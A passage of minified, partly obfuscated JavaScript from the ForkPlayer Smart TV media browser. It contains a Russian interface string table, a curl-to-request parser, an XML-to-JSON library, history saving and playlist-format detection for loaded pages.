очищена","PrRabStogoMesta":"Продолжать работу с того же места","Nastroiki":"Настройки","ChPoyas":"Часовой пояс","Time offset":"Смещение времени","Perekl":"Перекл.","KachVideo":"Качество видео","KolStrok":"Количество строк","Videopleer":"Видеоплеер","Hide":"Скрыть","pleer":"плеер","Sortirovka":"Сортировка","Rezhim":"Режим","NachGrupa":"Начальная группа","RodKontr":"Родительский контроль","FonRisunok":"Фоновый рисунок","Donate to browser development in Profile":"Поддержите разработку браузера в Профиле","Mac address":"Мак адрес","YarkFon":"Яркость фона (Произв.)","CvetText":"Цвет текста","VkKod":"Вконтакте код","MoiUvedoml":"Мои уведомления","PolnSbrosNastr":"Полный сброс настроек","Yazik":"Язык","PereklM":"Переключение между","DelMuvT":"Делайте меньше для увеличения текста","TvpPu":"Тип видео плеера по умолчанию","TipPu":"Тип плеера IPTV по умолчанию","Sort":"Сортировать","Enabling can slow opening iptv lists":"Включение может замедлить открытие списков iptv","KartVKart":"Картинка в картинке<br>Автоматический предпросмотр видео в маленьком окошке (при отключенной опции PIP для выбранного видео включить можно кнопкой плей на пульте)","vospr":"воспроизведения","prilozheniya":"приложения","RemoteInfo":"RemoteFork это вспомогательная программа для <br>— запуск с  некоторых  ресурсов (торренты, moonwalk)<br>— загрузка плейлистов с компьютера во внешние закладки без регистрации на сайте<br>— доступ к плейлистам,файлам компьютера с ForkPlayer<br>— плагины, работа сайтов требующих ремотефорка, торрент трекеры<br>Для включения необходимо скачать и запустить программу Remote Forkplayer на компьютере или андроиде подключенному к тому же роутеру что и ТВ<br>Ссылка на скачивание","PrivVk":"Привязка своего аккаунта Вконтакте","Font":"Шрифт","polzovatelya":"пользователя","SsilkaVkKod":"Ссылка где можно получить код привязки","VashUvNp":"Ваши уведомления, например пароль от сайта","ZsIsN":"Загрузка на сервер или скачивание всех настроек виджета","zaklIist":"закладок и истории","VvKodPr":"Введите код привязки ВК","Auto":"Авто","Tolko":"Только","DlyaVsV":"Для всех видео","BistrPoisk":"Быстрый поиск","Parol":"Пароль","parol":"пароль","to":"до","mo":"мес","DlDostVv":"Для доступа введите","DeistDoV":"действует до выхода в стартовое меню<br>Или нажмите Назад для отмены","Default":"По умолчанию","poumolch":"по умолчанию","Adult content":"Взрослый контент","Third-party content":"Сторонний контент","SmIotk":"Сменить или отключить","moV":"можно в","My bookmarks and history":"Мои закладки и история","RazblVkl":"Разблокировать вкладку","EtaVklBzabl":"Эта вкладка была заблокирована","DlRvIn":"Для разблокировки выделите ее и нажмите","VvedNov":"Введите новый","DlUdVved":"Для удаления введите","ZablVkl":"Заблокировать вкладку","UstSart":"Установить стартовой","UdIzSt":"Удалить из стартовой","ustanovit":"установить","Media":"Медиа","Vstroenniy":"Встроенный","OtmNeProsm":"Отметить непросмотренным","OtmProsm":"Отметить просмотренным","DobavVglob":"Добавить в поисковые системы","Peredvinut":"Передвинуть","VijtiV":"Выйти в","EXIT":"ВЫХОД","listSservera":"лист с сервера","DobavitV":"Добавить в","Use in search":"Использовать в поиске","OchistitIstoriyu":"Очистить историю","ObnovitStranicy":"Обновить страницу","izZakladok":"из закладок","PeremV":"Переместить в","Clear cache":"Очистить кеш","OshibkaSohrDannih":"Ошибка сохранения данных","OshibkaChDannih":"Ошибка чтения данных","ustanolen":"установлен","VineSmP":"Вы не сменили пароль 0000!<br><i>Рекомендуем сменить пароль Родительского контроля для защиты от детей","ParolDeistDk":"Пароль действует до выхода в стартовое меню! Не забудьте выйти в стартовое меню по окончанию","nePodhodit":"не подходит","PrilUstSh":"Приложения устанавливаются в смартхаб","IzvFailovNo":"Извините, файлов не обнаружено","sIst":"с источника","PerPoAdr":"Перейти по адресу","OshibkaParsPl":"Ошибка парсинга страницы","OshibkaObrabotki":"Ошибка обработки","Informaciya":"Информация","Click now right to go to the category selection":"Нажмите сейчас вправо для перехода к выбору категории","DlyaPerNsp":"Для перехода на следующую страницу нажмите кнопку вправо","infodns":"Используйте RemoteFork<br>(в настройках, необходим компьютер или андроид) для более быстрой навигации по этому сайту","January":"Января","February":"Февраля","March":"Марта","April":"Апреля","May":"Мая","June":"Июня","Jule":"Июля","August":"Августа","September":"Сентября","October":"Октября","November":"Ноября","December":"Декабря","Monday":"Пн","Tuesday":"Вт","Wednesday":"Ср","Thursday":"Чт","Friday":"Пт","Saturday":"Сб","Sunday":"Вс","Md":"Пн","Tu":"Вт","Wd":"Ср","Th":"Чт","Fr":"Пт","St":"Сб","Sn":"Вс","Only local":"Только локально","Subtitles":"Субтитры","Video & Audio":"Видео & Аудио","Settings":"Настройки","Network":"Сеть","Start Page":"Начальная страница","Omnibox address bar and search":"Адресная строка омнибокса и поиск","Oshibka":"Ошибка","polVr":"получения времени","UspIdPolz":"Успешно!<br>ID пользователя","NeobhUstIzap":"Необходимо установить и запустить на компьютере программу","SbrositNastr":"Сбросить настройки","VsaeZaklUd":"Все закладки, история, настройки будут удалены","PrevLimOzh":"Превышен лимит ожидания","Favorites":"Избранное","opredDns":"определения ДНС","Configuring search":"Настройка поиска","Configuring start menu":"Настройка старт. меню","Top queries":"Топ запросов","Enter search query or URL":"Введите поисковый запрос или URL","VvediteText":"Введите текст","PustayaSsilka":"Пуcтая ссылка","Obrabotka":"Обработка","Recover my account data":"Создать или войти в аккаунт","NetOtvetaUbedRemote":"Нет ответа! Убедитесь что включен RemoteFork","PovtorPop":"Повторная попытка","ProvSostRem":"Проверьте состояние RemoteForkplayer на компьютере","polSsilki":"получения ссылки","EtoStList":"Это стартовый плейлист","NeskEl":"Несколько элементов","Add all links":"Добавить все ссылки","Add a search engine":"Добавить поисковую систему","stMenuSkr":"стартового меню  скрыто<br>Включить их можно в Настройках / Настройка старт. меню","VvedAdrPl":"Введите адрес","SudaMozhVv":"Введите адрес плейлиста M3U, XML","Vkontakte":"Вконтакте","VashaStrVk":"Ваша страница вконтакте","PrivVk":"Привязать ВК","KodPolZd":"Код получать здесь","FailKnR":"Файлы вашего компьютера. (Необходимо запустить RemoteForkplayer на компьютере и включить","PamyatTv":"Память ТВ","VverhVniz":"Вверх / Вниз","Save":"Сохранить","Your search engines":"Ваши поисковые системы","VPLEER":"В ПЛЕЕР","Vnutr":"Внутр","Vnesh":"Внешн","StartMenu":"Старт меню","SleduushayaStr":"Следующая стр","Ostanovleno":"Остановлено","Iskat":"Искать","Podkluchenie":"Соединение","SoedineniePrervano":"Соединение прервано","Preferred server":"Предпочитаемый сервер","soedineniya":"соединения","podklucheniya":"подключения","SbrosVipolnenPerezpusk":"Сброс настроек приложения выполнен!<br>Перезапуск виджета","Prodolzhit":"Продолжить","Otmena":"Отмена","Live search":"Живой поиск","Screensaver":"Заставка","Confirm action":"Подтвердите действие","To cancel the search, press again":"Для отмены поиска нажмите еще раз","VseRavnoProdolzhit":"Все равно продолжить","parsingaVideossilki":"парсинга видеоссылки","NevernayaSsilka":"Неверная ссылка","Proporcii":"Пропорции","OpciiEkrana":"Опции экрана","OchishPamyati":"Очищ. памяти","min":"мин","Kachestvo":"Качество","Nedostupno":"Недоступно","New inset":"Новая вкладка","New private inset":"Новая приватная вкладка","SeichasNedostupno":"Сейчас недоступно","Shirina":"Ширина","Visota":"Высота","Buffer":"Буффер","Latest stable":"Последняя стабильная","Mb":"Мб","ZvukDorozhka":"Звук. дорожка","Ekran":"Экран","Gromkost":"Громкость","Tip":"Тип","Date":"Дата","Album":"Альбом","Original":"Оригинал","Rastyanut":"Растянуть","Ruchnoi":"Ручной","VozobnovitNa":"Возобновить","Posledovatelno":"Последовательно","Povtoryat":"Повторять","odin":"один","vse":"все","in":"в","DostupRazreshen":"Доступ разрешен","REKLAMA":"РЕКЛАМА","PereadresaciyaNaFail":"Переадресация на файл","Vneshniy":"Внешний","NpllIIO101FLx100Q01Ypr":"Не подходит ТВ программа","VoVremProsNazh":"Во время просмотра IPTV канала нажмите","VmEmVp":"В Меню -> ЕПГ код можно выбрать подходящую","dVp":"для выбора подходящей","VmVpostBiCe":"Вместо видео постоянно белый или черный экран?<br><i>Попробуйте другой тип","HotChtVfon":"Хотите чтобы видео играло в фоне? Нажмите","vVrPrVid":"во время проигрывания видео","Close tab":"Закрыть вкладку","KnInfoPerRezh":"Кнопка инфо на пульте переключает режим отображения информации при просмотре видео","Video":"Видео","video":"видео","nePodderzhivaetsya":"не поддерживается","DrugZvDorNet":"Других звуковых дорожек нет","PustayaIliUdalSsilkaVK":"Пустая или удаленая ссылка ВК","Podtverdit":"Подтвердить","OzhidaiteNeskSec":"Ожидайте несколько секунд","NazhmExitEsheRazDlyaVihoda":"Нажмите EXIT еще раз для выхода","ViNeSmeniliPassRodKontrRekomendSm":"Вы не сменили пароль 0000!<br><i>Рекомендуем сменить пароль Родительского контроля для защиты от детей</i>","ParolDeistDk":"Пароль действует до выхода в стартовое меню! Не забудьте выйти в стартовое меню по окончанию","PoiskAudio":"Поиск аудиозаписей","Source code":"Исходный код","PoiskVideo":"Поиск видеозаписей","PoiskFoto":"Поиск фото (дост. без авторизации)","MoiAudio":"Мои аудиозаписи","MoiVideo":"Мои видеозаписи","Recomend":"Рекомендации","Popular":"Популярное","Druzya":"Друзья","Gruppi":"Группы","SetFon":"Установить как фон","Audio":"Аудиозаписи","PoiskPeople":"Поиск людей","Authorization":"Авторизация","My":"Мои","OshibkaAvtorizacii":"Ошибка авторизации","VashiDruzya":"Ваши друзья","VashiGruppi":"Ваши Группы","Uchastnikov":"Участников","byLogin":" по логину и паролю","byCode":" по коду","IdetUstanovkaVidgeta":"Идет установка виджета","Ustanovka":"Установка","vidgeta":"виджета","Razmer":"Размер","GB":"ГБ","MB":"МБ","KB":"КБ","Bait":"Байт","Vidget":"Виджет","Manually":"Вручную","Enter":"Введите","OpenWidget":"Открыть виджет","Open":"Открыть","InstallWidgetInSmartHub":"Если вы уверены, что это виджет для самсунг смарт тв, то нажмите ентер для установки","recomOpenFromSmartHub":"необходимо запускать с смартхаба","ForkPlayerByClosed":"ForkPlayer будет закрыт<br>Возможна работа не на весь экран, для полноценной работы","NoDevices":"Нет подключенных","Open":"Открыть","Forced without a background":"Принудительно без фона","Sorting":"Сортировка","Archive":"Архив","Higher":"Самый верх","Top":"Верх","Bottom":"Низ","Lower":"Самый низ","TVmemory":"Внутренняя память","uzheEstVustanovlennih":"уже есть в установленных","uspeshnoUstanovlen":"успешно установлен","VnimanieSvobMesto":"Внимание! Убедитесь что в архиве находится именно виджет для самсунг смарт тв и достаточно свободного места","ViklIvklTVchtobiUv":"Выключите и включите ТВ чтоб увидеть","OshibkaUstanovki":"Ошибка установки","vSmHubVidgNaidDop":"в смартхаб!</b><br>Виджет вы найдете в приложениях в смартхабе, или в Дополнительные приложения (Серия F)","PustayaPapka":"Пустая папка","BlueKnProporcii":"<i>Изменение пропорций видео</i><br><span style='background-color:red;font-size:10px;'>&nbsp;&nbsp;&nbsp;</span> Синяя кнопка во время проигрывания видео","Zakrit":"Закрыть","NachatZanovo":"Начать заново","ZagruzhatListiMozhoS":"Загружать сюда листы с компьютера можно с помощью","Summa":"Сумма","Valuta":"Валюта","PlatSistema":"Платежная система","NaprimerVchera":"Например, вчера в","VvDatuPlatezha":"Введите дату и время платежа","ThanksForYou":"Спасибо за поддержку проекта","Ozhidanie":"Ожидание","Prinyato":"Обработка","Enter URL or search on":"Введите URL или выполните поиск по","Bookmark toolbar":"Панель закладок","NeobhodimRemoteFork":"Для выполнения этой операции необходимо запустить RemoteFork на компьютере или андроиде<br>Подробнее на forkplayer.tv","Translate":"Перевести страницу на ","Yazik":"Язык","OchistIst":"Очистить поле / историю","VVOD":"ВВОД","BistrijPoskVverh":"Быстр. поиск: Вверх","Vniz":"Вниз","Vibrat":"Выбрать","system":"Системная","Recommendation":"Рекомендации","Clear recommendation":"Очистить рекомендации","Documenti":"Документы","Photo":"Фотографии","l0IlI0I10LMNlOI1IYpr":"Клавиатура","keyboard":"клавиатура","fromPage":"со страницы","fromWall":"со стены","photo":"фото","Exit":"Выйти","SavedPhoto":"Сохраненные фотографии","Slideshow":"Слайдшоу","sec":"сек","Category":"КАТЕГОРИЯ","Categorys":"Категории","ForResetAppPressButton":"Для сброса настроек, нажмите сейчас кнопку","ALL":"ВСЕ","OpenFromProxy":"Запуск через прокси","PredpDor":"Предп. дорожка","InFullScreen":"На весь экран","Iread":"Я прочитал(а)","NotShow":"Больше не показывать","AudioMini":"Аудио мини","OffMiniPlayer":"Здесь можно отключить использование специального мини плеера для проигрывания mp3 файлов","ConnectToServer":"Соединение с сервером","NewDNS":"Доступен новый ДНС","From":"Отправитель","AutoSync":"Автосинхронизация","Mark":"Отметить","several":"несколько","existOverwrite":"существует! Перезаписать?","OverwriteAll":"Перезаписать все","SkipAll":"Пропустить все","Deselect":"Отменить выделение","Queue":"В очереди","DeleteFromStartMenu":"Удалить из стартового меню","Edit":"Редактировать","Rename":"Переименовать","Interface Setup":"Настройка интерфейса","ChangeURLicon":"Сменить адрес иконки","EnterURLicon":"Введите адрес иконки","Icon":"Иконка","SetIconFor":"Установить иконкой для","EnterTitle":"Введите название","SelectIcon":"Выбрать иконку","Timeout connection to stream IPTV":"Таймаут подключения к IPTV","SetDefaultStartMenu":"Сбросить настройки старт. меню","PreviousFileWillBeOverwritten":"Предыдущий архив настроек будет перезаписан","PressStopToCancel":"Нажмите Стоп для отмены","Show rating":"Рейтинг ссылок","Count":"Количество","Percent":"Проценты","Server":"Сервер","or Add search engine in settings":"или Добавьте поисковую систему в настройках","Show ratings and views of resources and playlists":"Показывать рейтинг и количество просмотров ресурсов и плейлистов","WhileCopyingFilesCannotViewVideoAndAudio":"Во время копирования файлов нельзя смотреть видео и аудио","NeedToOpenAndCloseTheVideoPlayerThenRepeatCopying":"Нужно открыть и закрыть это видео в плеере, потом повторить копирование"};function totranslit(text,engToRus){var rus="щ   ш  ч  ц  ю  я  ё  ж  ъ  ы  э  а б в г д е з и й к л м н о п р с т у ф х ь".split(/ +/g),eng="shh sh ch cz yu ya yo zh `` y' e` a b v g d e z i j k l m n o p r s t u f x `".split(/ +/g);var x;for(x=0;x<rus.length;x++){text=text.split(engToRus?eng[x]:rus[x]).join(engToRus?rus[x]:eng[x]);text=text.split(engToRus?eng[x].toUpperCase():rus[x].toUpperCase()).join(engToRus?rus[x].toUpperCase():eng[x].toUpperCase())}
return text}
if(typeof JSON!=="object"){JSON={}}
if(typeof Object.create==='undefined'){Object.create=function(o){function F(){}
F.prototype=o;return new F()}}
if(!Object.keys){Object.keys=(function(){'use strict';var hasOwnProperty=Object.prototype.hasOwnProperty,hasDontEnumBug=!({toString:null}).propertyIsEnumerable('toString'),dontEnums=['toString','toLocaleString','valueOf','hasOwnProperty','isPrototypeOf','propertyIsEnumerable','constructor'],dontEnumsLength=dontEnums.length;return function(obj){if(typeof obj!=='object'&&(typeof obj!=='function'||obj===null)){throw new TypeError('Object.keys called on non-object')}
var result=[],prop,i;for(prop in obj){if(hasOwnProperty.call(obj,prop)){result.push(prop)}}
if(hasDontEnumBug){for(i=0;i<dontEnumsLength;i++){if(hasOwnProperty.call(obj,dontEnums[i])){result.push(dontEnums[i])}}}
return result}}())}
function mh(s,i){if(handler=="menu"){if(getSelect()!=-s||oInset.omni_hor!=i){setSelect(-4);oInset.omniSel(i);linkOver()}}}
var ext_player=!1,send,ptext="";var nupd=0;if(!document.getElementsByClassName){document.getElementsByClassName=function(cls,node,tag){if(!node)node=document;if(!tag)tag='*';var them=node.getElementsByTagName(tag),rez=[];for(var notI=0;notI<them.length;++notI)
if(them[notI].className==cls)rez.push(them[notI]);return rez}}
function nmlz(s){s=trim11(s.replace(/<.*?>/g," ").replace(/сезон \d+/i,"").replace(/серия \d+/i,"").replace(/[\(\):\/\-!\?,\.\|]/g," "));s=s.replace(/\s+/g," ");return s}
function totrim(s){return s.replace(/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,'')}
function trim11(str){str=str.replace(/^\s+/,'');for(var i=str.length-1;i>=0;i--){if(/\S/.test(str.charAt(i))){str=str.substring(0,i+1);break}}
return str}
function grm(min,max){return Math.floor(Math.random()*(max-min))+min}
function parseCURL(s){if(0!=s.indexOf('curl '))return;var ch,regexp=new RegExp("(-[-a-zA-Z]+)?(\\s*?(\"|')(.*?[^\\\\])\\3)?(\\s|$)","g");var out={url:"",method:'GET',header:{}};var x=0;while((ch=regexp.exec(s))!==null){if(ch.index===regexp.lastIndex)regexp.lastIndex++;if(x++>40)break;var arg=ch[1]||"";var param=ch[4]||"";if(ch[3])param=param.replace(new RegExp("\\\\"+ch[3],"g"),ch[3]);switch(!0){case arg=='-A'||arg=='--user-agent':out.header['User-Agent']=param;break;case arg=='-e'||arg=='--referer':out.header.Referer=param;break;case arg=='-H'||arg=='--header':var field=param.split(":");out.header[field[0]]=(field[1]||"").replace(/^\s+/,"");break;case arg=='-d'||arg=='--data'||arg=='--data-ascii':out.method='POST';out.header['Content-Type']=out.header['Content-Type']||'application/x-www-form-urlencoded';out.body=param;break;case arg=='-u'||arg=='--user':out.header.Authorization='Basic '+btoa(param);break;case arg=='-I'||arg=='--head':out.method='HEAD';break;case arg=='-X'||arg=='--request':out.method=param;break;case arg=='-b'||arg=='--cookie':out.header['Set-Cookie']=param;break;case(param&&param.match(/^https?:\/\//)&&!0):out.url=param;break;case arg=='--compressed':out.header['Accept-Encoding']=out.header['Accept-Encoding']||'deflate, gzip';break}}
return out}
function ext_focus(b){if(b==null){handler="menu";IlO11lQ0().focused(0)}
handler="ext";try{$_("frame-id").contentWindow.postMessage({'cmd':'focus','text':''},"*")}catch(e){}}
function ext_close(){handler="menu";$_("ext","");$_("ext").style.display="none"}
window.addEventListener('message',function(event){if(lIllO0Imlel1IlI1Ypr=="playerjs"&&(handler=="player"||handler=="qual")){vPlayer.playerjs.message(event);return}},!1);var emptyCh={"title":"_FPZdesPusto_","description":"","stream_url":"","logo_30x30":"","playlist_url":""};var xhrParse,abortedParse=!1,assyncTimer=null,selfpages={};function OpenUrl(url,n){if(n!=null){url.navigateurl=n}
IlO11lQ0().navigate(url)}
function OpenGoBack(){tmf()}
function collect(a,b){var d={};for(p in a){d[p]=a[p]}
for(p in b){d[p]=b[p]}
return d}
var xmlToJSON=(function(){this.version="1.3.4";var options={mergeCDATA:!0,grokAttr:!0,grokText:!0,normalize:!0,xmlns:!0,namespaceKey:'_ns',textKey:'_text',valueKey:'_value',attrKey:'_attr',cdataKey:'_cdata',attrsAsObject:!0,stripAttrPrefix:!0,stripElemPrefix:!0,childrenAsArray:!1};var prefixMatch=new RegExp(/(?!xmlns)^.*:/);var trimMatch=new RegExp(/^\s+|\s+$/g);this.grokType=function(sValue){if(/^\s*$/.test(sValue)){return null}
if(/^(?:true|false)$/i.test(sValue)){return sValue.toLowerCase()==="true"}
if(isFinite(sValue)){return parseFloat(sValue)}
return sValue};this.parseString=function(xmlString,opt){return this.parseXML(this.stringToXML(xmlString),opt)}
this.parseXML=function(oXMLParent,opt){for(var key in opt){options[key]=opt[key]}
var vResult={},nLength=0,sCollectedTxt="";if(options.xmlns&&oXMLParent.namespaceURI){vResult[options.namespaceKey]=oXMLParent.namespaceURI}
if(oXMLParent.attributes&&oXMLParent.attributes.length>0){var vAttribs={};for(nLength;nLength<oXMLParent.attributes.length;nLength++){var oAttrib=oXMLParent.attributes.item(nLength);vContent={};var attribName='';if(options.stripAttrPrefix){attribName=oAttrib.name.replace(prefixMatch,'')}else{attribName=oAttrib.name}
if(options.grokAttr){vContent[options.valueKey]=this.grokType(oAttrib.value.replace(trimMatch,''))}else{vContent[options.valueKey]=oAttrib.value.replace(trimMatch,'')}
if(options.xmlns&&oAttrib.namespaceURI){vContent[options.namespaceKey]=oAttrib.namespaceURI}
if(options.attrsAsObject){vAttribs[attribName]=vContent}else{vResult[options.attrKey+attribName]=vContent}}
if(options.attrsAsObject){vResult[options.attrKey]=vAttribs}else{}}
if(oXMLParent.hasChildNodes()){for(var oNode,sProp,vContent,nItem=0;nItem<oXMLParent.childNodes.length;nItem++){oNode=oXMLParent.childNodes.item(nItem);if(oNode.nodeType===4){if(options.mergeCDATA){sCollectedTxt+=oNode.nodeValue}else{if(vResult.hasOwnProperty(options.cdataKey)){if(vResult[options.cdataKey].constructor!==Array){vResult[options.cdataKey]=[vResult[options.cdataKey]]}
vResult[options.cdataKey].push(oNode.nodeValue)}else{if(options.childrenAsArray){vResult[options.cdataKey]=[];vResult[options.cdataKey].push(oNode.nodeValue)}else{vResult[options.cdataKey]=oNode.nodeValue}}}}else if(oNode.nodeType===3){sCollectedTxt+=oNode.nodeValue}else if(oNode.nodeType===1){if(nLength===0){vResult={}}
if(options.stripElemPrefix){sProp=oNode.nodeName.replace(prefixMatch,'')}else{sProp=oNode.nodeName}
vContent=xmlToJSON.parseXML(oNode);if(vResult.hasOwnProperty(sProp)){if(vResult[sProp].constructor!==Array){vResult[sProp]=[vResult[sProp]]}
vResult[sProp].push(vContent)}else{if(options.childrenAsArray){vResult[sProp]=[];vResult[sProp].push(vContent)}else{vResult[sProp]=vContent}
nLength++}}}}else if(!sCollectedTxt){if(options.childrenAsArray){vResult[options.textKey]=[];vResult[options.textKey].push(null)}else{vResult[options.textKey]=null}}
if(sCollectedTxt){if(options.grokText){var value=this.grokType(sCollectedTxt.replace(trimMatch,''));if(value!==null&&value!==undefined){vResult=value}}else if(options.normalize){vResult=sCollectedTxt.replace(trimMatch,'').replace(/\s+/g," ")}else{vResult=sCollectedTxt.replace(trimMatch,'')}}
return vResult}
this.xmlToString=function(xmlDoc){try{var xmlString=xmlDoc.xml?xmlDoc.xml:(new XMLSerializer()).serializeToString(xmlDoc);return xmlString}catch(err){return null}}
this.stringToXML=function(xmlString){try{var xmlDoc=null;if(window.DOMParser){var parser=new DOMParser();xmlDoc=parser.parseFromString(xmlString,"text/xml");return xmlDoc}else{xmlDoc=new ActiveXObject("Microsoft.XMLDOM");xmlDoc.async=!1;xmlDoc.loadXML(xmlString);return xmlDoc}}catch(e){return null}}
return this}).call({});if(typeof module!="undefined"&&module!==null&&module.exports)module.exports=xmlToJSON;else if(typeof define==="function"&&define.amd)define(function(){return xmlToJSON});function escapeHtml(text){var map={'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#039;'};return text.replace(/[&<>"']/g,function(m){return map[m]})}
function lI10IOOuVKI0QI11Ypr(){var u=gV(curPage.global,"url");if(curPage.lII1I1PVBuI1lIlYpr.indexOf("#submenu")>0)u="";if(u==""){if(curPage.lII1I1PVBuI1lIlYpr.indexOf("obovse.ru")==-1||curPage.lII1I1PVBuI1lIlYpr.indexOf("mylist.obovse.ru")>0)u=curPage.lII1I1PVBuI1lIlYpr.replace(/(\?|&)?w_lang=.*/,"");else{for(var i in baseurl){if(curPage.lII1I1PVBuI1lIlYpr.indexOf(i.replace("http://",""))>=0)u="file://localparse/"+baseurl[i]}}}
u=u.replace(/http:\/\/.*?\/obovse.ru\//,"file://");return u}
function getInfoUrl(url){if(url==null){url=gV(Ill001("lII1I1PVBuI1lIlYpr")||gP("lII1I1PVBuI1lIlYpr"))}
if(url.indexOf("/alexkdpulg.php?list=")>0)url=unescape(url.split("?list=")[1]);url=url.replace(/(\?|&)?w_lang=.*$/,"");return url}
var userTop={};function lIIOOOa1ag001OIYpr(o){try{if(IlO11lQ0("is_private"))return;var xu=gP().lII1I1PVBuI1lIlYpr;var ICON=IlO11lQ0().getIcon();var TITLE=IlO11lQ0().get("title");var curPage=IlO11lQ0();if(IlO11lQ0().get("url",-2)=="about:blank"){var se=IlO11lQ0().get("s",-2);if(se>=0){var data=getVars("about:blank");if(se!=""&&!ICON.match(/1px\.png/))if(data.channels[se].source=="fav"&&gV(data.channels[se],"logo_30x30")==""){data.fav[data.channels[se].id].logo_30x30=ICON;setVars("start",data)}}}
if(!xu.match(/^(http|html:\/\/http|vk)/)||xu.match(/(#submenu|no_save)/)||is_ifr()||l0O0l0111mJXG1OII1OYpr()||gV(curPage.page.global,"cacheinfo")=="nocache"){return}
if(handler=="menu"&&o){if(!is_local(xu)&&!xu.match(/(#submenu|#archive|no_save|search=)/)&&!TITLE.match(/^Стр. (\d+) \/ (.*)$/)){var nx=1;var pu=IlO11lQ0().get("url",-2);if(pu=="about:blank"){var se=IlO11lQ0().get("s",-2);if(se>=0){var data=getVars("about:blank");if(se!=""&&!ICON.match(/1px\.png/))if(data.channels[se].source=="fav"&&gV(data.channels[se],"logo_30x30")==""){data.fav[data.channels[se].id].logo_30x30=ICON;setVars("start",data)}}
nx=6}else if(pu.match(/^http:\/\/spiderxml\.com($|#)/))nx=6;if(typeof userTop[xu]=="undefined")userTop[xu]={"c":nx,"title":TITLE,"logo_30x30":ICON,"tp":T.timestamp,"parser":IlO11lQ0().get("p"),"local":IlO11lQ0().get("l")};else{userTop[xu].c+=1;userTop[xu].tp=T.timestamp}
maJor.write("datas",ll1lI1lI0sl0OlIYpr(userTop))}else{}
if(gV(lOO1IIlwlIl0l1lYpr[0],"xml_url")!=xu){lOO1IIlwlIl0l1lYpr.unshift({"xml_url":xu,"type":gV(o.parentCh,"type"),"model":model,"hardware":kjtYpr.hardware,"time":T.timestamp,"title":TITLE,"icon":ICON})}}else if(handler=="player"){if(getSelect()>=0){if(gV(lOO1IIlwlIl0l1lYpr[0],"xml_url")==xu&&gV(lOO1IIlwlIl0l1lYpr[0],"select")==getSelect()){lOO1IIlwlIl0l1lYpr[0].start_time=curTime}else lOO1IIlwlIl0l1lYpr.unshift({"xml_url":xu,"model":model,"hardware":kjtYpr.hardware,"time":T.timestamp,"select":getSelect(),"ch":{"logo_30x30":curPage.curCh("logo_30x30"),"title":curPage.curCh("title"),"play_url":vPlayer.playUrl,"stream_url":curPage.curCh("stream_url"),"parser":curPage.curCh("parser"),"ident":vPlayer.playElement.ident,"start_time":vPlayer.curTime,"total_time":vPlayer.totalTime},"title":TITLE,"icon":ICON})}}
if(lOO1IIlwlIl0l1lYpr.length>100)lOO1IIlwlIl0l1lYpr.splice(100,1);maJor.write("history",ll1lI1lI0sl0OlIYpr(lOO1IIlwlIl0l1lYpr))}catch(e){kjtYpr.popUp("Error save history<br>"+e.message,2200)}}
function incID(){kjtYpr.REQUEST_ID++;return kjtYpr.REQUEST_ID}
function pUrl(u,m){if(m==null)m="http:";if(typeof u=="undefined")return"";else if(u.indexOf("//")==0)return m+":"+u;else if(u.indexOf("http")==0)return u;return u}
var incpage=0;var FXMLPage={create:function(){var c=Object.create(this);c.channels=[];c.request_id=null;c.menu=[];c.style={};c.lII1I1PVBuI1lIlYpr="";c.URL_REQUEST="";c.typeSource="";c.group=[];c.IFRAMES=[];c.IFRAMES_INSERT=0;c.curCh=null;c.parentCh=null;c.REQUEST_XXX=0;c.source="";c.is_iptv=0;c.hideRight=0;c.REQUEST_ID=null;c.global={};c.l11I101vQBOw0llIYpr=null;c.typeList="list";c.xhrParse=null;c.abortedParse=!1;c.assyncTimer=null;c.l0IOOl1l01azgIl01lOYpr=null;c.sPos={}
c.sPosX=0;c.sPosY=0;c.CAS=[];c.count=0;c.posX=0;c.posY=0;c.canceled=0;c.SEARCH_TEMPL="";incpage++;c.inc=incpage;c.input={};c.llIl1100glLO10l1Ypr=0;c.is_mark=0;c.is_mark_array={};c.ERR=null;return c},toTags:function(k,t){for(var i=0;i<t.length;i++)if(typeof k[t[i]]=="undefined")k[t[i]]="";return k},detChxxx:function(v){if(maJor.params.get('passwordkey')!=""&&kjtYpr.Password!=maJor.params.get('passwordkey')){if(v.playlist_url!="submenu"&&gV(v,"type")!="enterurl"&&(is_xxx(v.stream_url)||is_xxx(v.playlist_url)||is_xxx(v.title)||is_xxx(v.group))){this.REQUEST_XXX=1;this.showParrent(v);return 1}
if(gV(v,"is_parent_lock")=="1"){this.REQUEST_XXX=1;this.showParrent(v);return 1}}},cancel:function(){var c=this;if(typeof c.l11I101vQBOw0llIYpr.page=="undefined")c.l11I101vQBOw0llIYpr.page=c;c.canceled=1;clearTimeout(c.tTimer);if(c.xhr!=null)c.xhr.abort();if(c.l11I101vQBOw0llIYpr.page.canceled)$_("page_load").src=_img('_ST_page_reload.png');delete c.l11I101vQBOw0llIYpr.loadPage;sethash()},oncomplete:function(pq){try{var c=this,data=null;if(c.canceled){return}
var s=gV(pq,"source");c.source=s;var xml_url=c.lII1I1PVBuI1lIlYpr;if(!c.llIl1100glLO10l1Ypr){if(s=="-histback-"){c.cancel();pq.l11I101vQBOw0llIYpr.reload();return}
if(s=="-histback1-"){c.cancel();pq.l11I101vQBOw0llIYpr.navigateHist(-2);return}}
c.typeSource="";if(gV(pq.elCh,"local")=="html"){c.typeSource="html";$_("ext").style.display="block";$_("ext",'<iframe onerror="" id="frame-id" style="margin-top: 0px; border:none; background-color:black;" width="1280" height="640" src="'+xml_url+'" />');kjtYpr.popUp("<img width='55' src='"+_img("_ST_important.png")+"' style='float:left;padding-right:5px;' /> "+"Запущен сайт в iframe<br>"+"Меню (красная кнопка) - Закрыть<br>"+"CH UP / CH DOWN - Открыть другую вкладку"+"",2000);handler="ext";return}else if((s.indexOf("<channel>")>0||s.indexOf("<items>")>0)&&s.indexOf('"channels":[')==-1&&s.indexOf('#EXTINF:')==-1){data=l01O10IilOoIIO1Ypr(s);c.typeSource="xml"}else if(apijsUrl==""&&s.indexOf("#EXTINF:")>-1){data=lIllllIF1l0O1I1IYpr(s,xml_url);if(data.channels.length)c.typeSource="m3u";else data=l0OIIlIIlONuu1111Ypr(s)}else if(c.URL_REQUEST.indexOf("45397/MediaServer")>0){maJor.params.set("hms",xml_url.substr(7,xml_url.indexOf(":45397")-1));data=parsehms(s);c.typeSource="hms"}else if(c.URL_REQUEST.indexOf("http://"+getip("torrserve")+"/")===0){data=llO0O0NBO0II10Ypr(s,c.URL_REQUEST);c.typeSource="torrserve"}else 